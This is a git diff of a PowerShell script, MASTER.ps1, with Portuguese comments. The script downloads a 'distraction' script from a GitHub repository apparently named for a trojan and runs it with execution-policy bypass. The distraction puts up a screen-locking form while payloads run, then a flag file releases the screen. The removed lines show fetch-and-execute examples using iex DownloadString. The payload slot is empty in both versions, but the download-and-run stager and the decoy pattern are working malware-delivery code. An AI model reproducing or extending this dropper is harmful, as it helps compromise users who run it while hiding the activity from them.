@@ -1,26 +1,35 @@
 # ==============================================
-# MASTER.ps1 - VERSÃO SIMPLIFICADA E FUNCIONAL
+# MASTER.ps1 - COM LOGS E JANELA VISÍVEL
 # ==============================================
 
-# 1. Baixa o DISTRACTION.ps1 para um arquivo local (evita problemas de download na hora)
+"$(Get-Date) - MASTER.ps1 iniciado" | Out-File "$env:TEMP\distraction_log.txt" -Append
+
+# Baixa o DISTRACTION.ps1 para um arquivo local
 $distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
 $distractLocal = "$env:TEMP\distract.ps1"
-(New-Object Net.WebClient).DownloadFile($distractScript, $distractLocal)
 
-# 2. Abre o DISTRACTION.ps1 em uma nova janela do PowerShell (NORMAL, VISÍVEL)
+try {
+    (New-Object Net.WebClient).DownloadFile($distractScript, $distractLocal)
+    "$(Get-Date) - DISTRACTION.ps1 baixado para $distractLocal" | Out-File "$env:TEMP\distraction_log.txt" -Append
+} catch {
+    "$(Get-Date) - ERRO ao baixar DISTRACTION.ps1: $_" | Out-File "$env:TEMP\distraction_log.txt" -Append
+    exit 1
+}
+
+# Executa o DISTRACTION.ps1 em uma janela NORMAL (visível)
 Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Normal -Exec Bypass -File `"$distractLocal`"" -WindowStyle Normal
 
-# Aguarda a distração abrir o formulário (3 segundos)
-Start-Sleep -Seconds 3
+"$(Get-Date) - DISTRACTION.ps1 iniciado em nova janela." | Out-File "$env:TEMP\distraction_log.txt" -Append
 
-# 3. AQUI VOCÊ ADICIONA SEUS PAYLOADS (UM POR UM)
-# Exemplo:
-# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload1.ps1'))
-# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload2.ps1'))
+# Aguarda a distração abrir o formulário (5 segundos para garantir)
+Start-Sleep -Seconds 5
 
-Write-Host "Aguardando 10 segundos (payloads vazios)"
+# Seus payloads aqui...
+Write-Host "Aguardando 10 segundos (payloads vazios)" -ForegroundColor Cyan
 Start-Sleep -Seconds 10
 
-# 4. Cria a flag para destravar a tela
+# Cria a flag para destravar
 New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null
-Write-Host "Flag criada. Distração será encerrada."
+
+"$(Get-Date) - Flag criada. Distração será encerrada." | Out-File "$env:TEMP\distraction_log.txt" -Append
+Write-Host "Flag criada. Distração será encerrada." -ForegroundColor Green
